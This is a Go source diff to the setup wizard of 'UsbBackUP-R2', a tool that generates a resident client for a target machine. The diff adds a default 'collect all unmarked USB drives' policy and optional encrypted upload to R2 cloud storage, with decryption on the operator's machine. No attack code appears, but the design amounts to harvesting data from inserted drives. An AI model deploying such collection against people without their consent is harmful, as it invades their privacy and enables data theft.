@@ -21,6 +21,7 @@ import (
 
 	"github.com/immml/UsbBackUP-R2/internal/cli"
 	"github.com/immml/UsbBackUP-R2/internal/clientgen"
+	"github.com/immml/UsbBackUP-R2/internal/cred"
 	"github.com/immml/UsbBackUP-R2/internal/keystore"
 	"github.com/immml/UsbBackUP-R2/internal/version"
 )
@@ -68,9 +69,16 @@ func run(stdin io.Reader, stdout, stderr io.Writer) int {
 	fmt.Fprintf(stdout, "\n[4/5] 打包体积上限（0 表示不限制）\n")
 	maxTotal, _ := ask(r, stdout, "  上限", "10GiB")
 
-	// ---- 步骤 5：回写分支与输出 ----
-	fmt.Fprintf(stdout, "\n[5/5] 回写分支与输出（可直接回车跳过）\n")
-	srcDir, _ := ask(r, stdout, "  本地备份源目录（检测到私钥时回写到 U 盘）", "")
+	// ---- 步骤 5：采集策略、上传与输出 ----
+	fmt.Fprintf(stdout, "\n[5/5] 采集策略、上传与输出（可直接回车跳过）\n")
+	fmt.Fprintln(stdout, "  采集策略（all=未标记的盘一律采 / marker_only=只采带 .usbbackup-collect 的盘 / off=都不采）")
+	collect, _ := ask(r, stdout, "  采集策略", "all")
+	fmt.Fprintln(stdout, "  是否上传到 R2（需要先用 usbkeygen-r2 cred 生成 client.json）")
+	upload := askYesNo(r, stdout, "  开启上传？", false)
+	credName := cred.FileName
+	if upload {
+		credName, _ = ask(r, stdout, "  凭据文件名（与 client.exe 同目录）", cred.FileName)
+	}
 	name, _ := ask(r, stdout, "  客户端标识", "usbbackup-r2-client")
 	out, _ := ask(r, stdout, "  客户端输出路径", defaultOutput())
 	tpl, _ := ask(r, stdout, "  客户端模板（默认同目录 usbbackup-r2.exe）", clientgen.DefaultTemplate())
@@ -81,10 +89,11 @@ func run(stdin io.Reader, stdout, stderr io.Writer) int {
 	fmt.Fprintf(stdout, "  产物输出目录: %s\n", outDir)
 	fmt.Fprintf(stdout, "  容量阈值    : %s\n", threshold)
 	fmt.Fprintf(stdout, "  打包上限    : %s\n", maxTotal)
-	if strings.TrimSpace(srcDir) == "" {
-		fmt.Fprintln(stdout, "  回写分支    : 未启用")
+	fmt.Fprintf(stdout, "  采集策略    : %s\n", collect)
+	if upload {
+		fmt.Fprintf(stdout, "  上传到 R2   : 开启（凭据 %s，需与 exe 同目录）\n", credName)
 	} else {
-		fmt.Fprintf(stdout, "  本地备份源  : %s\n", srcDir)
+		fmt.Fprintln(stdout, "  上传到 R2   : 未开启（产物只落本地）")
 	}
 	fmt.Fprintf(stdout, "  客户端标识  : %s\n", name)
 	fmt.Fprintf(stdout, "  输出        : %s\n", out)
@@ -107,15 +116,17 @@ func run(stdin io.Reader, stdout, stderr io.Writer) int {
 
 	fmt.Fprintln(stdout, "\n正在生成…")
 	res, err := clientgen.Build(clientgen.Options{
-		PublicKeyPEM: pubPEM,
-		Template:     tpl,
-		Output:       out,
-		ClientName:   name,
-		OutputDir:    outDir,
-		SourceDir:    srcDir,
-		Threshold:    threshold,
-		MaxTotal:     maxTotal,
-		Force:        force,
+		PublicKeyPEM:   pubPEM,
+		Template:       tpl,
+		Output:         out,
+		ClientName:     name,
+		OutputDir:      outDir,
+		Threshold:      threshold,
+		MaxTotal:       maxTotal,
+		Collect:        collect,
+		EnableUpload:   upload,
+		CredentialFile: credName,
+		Force:          force,
 	})
 	if err != nil {
 		fmt.Fprintf(stderr, "生成失败：%v\n", err)
@@ -333,12 +344,24 @@ func printResult(stdout io.Writer, res clientgen.Result) {
 	fmt.Fprintf(stdout, "  产物输出目录: %s\n", res.OutputDir)
 	fmt.Fprintf(stdout, "  容量阈值    : %s\n", res.ThresholdText)
 	fmt.Fprintf(stdout, "  打包上限    : %s\n", res.MaxTotalText)
+	fmt.Fprintf(stdout, "  上传到 R2   : %v\n", res.UploadEnabled)
 	fmt.Fprintln(stdout)
 	fmt.Fprintln(stdout, "下一步：")
-	fmt.Fprintf(stdout, "  1) 把 %s 拷到目标机器（只需这一个文件）\n", filepath.Base(res.OutputPath))
+	if res.UploadEnabled {
+		fmt.Fprintf(stdout, "  0) 生成凭据：usbkeygen-r2 cred --out <与 %s 同目录>\\%s\n",
+			filepath.Base(res.OutputPath), res.CredentialFile)
+		fmt.Fprintln(stdout, "     注意：凭据与**目标机器**绑定，要在目标机器上生成；")
+		fmt.Fprintln(stdout, "           在你这台机器上生成的拿到那边解不开。")
+	}
+	fmt.Fprintf(stdout, "  1) 把 %s 拷到目标机器\n", filepath.Base(res.OutputPath))
 	fmt.Fprintln(stdout, "  2) 在那台机器上执行：accept      ← 首次确认，之后不再提示")
 	fmt.Fprintln(stdout, "  3) 然后执行：run                 ← 常驻监控；或 once 处理当前已插入的盘")
+	if res.UploadEnabled {
+		fmt.Fprintln(stdout, "  4) 在放私钥的机器上取回并解密：usbunseal-r2 pull --out <目录> --key <私钥>")
+	}
 	fmt.Fprintln(stdout)
 	fmt.Fprintln(stdout, "  私钥留在你这台机器上，不要随客户端分发；")
-	fmt.Fprintln(stdout, "  取回 .usbk 后用 usbunseal-r2 解密还原。")
+	if !res.UploadEnabled {
+		fmt.Fprintln(stdout, "  取回 .usbk 后用 usbunseal-r2 解密还原。")
+	}
 }
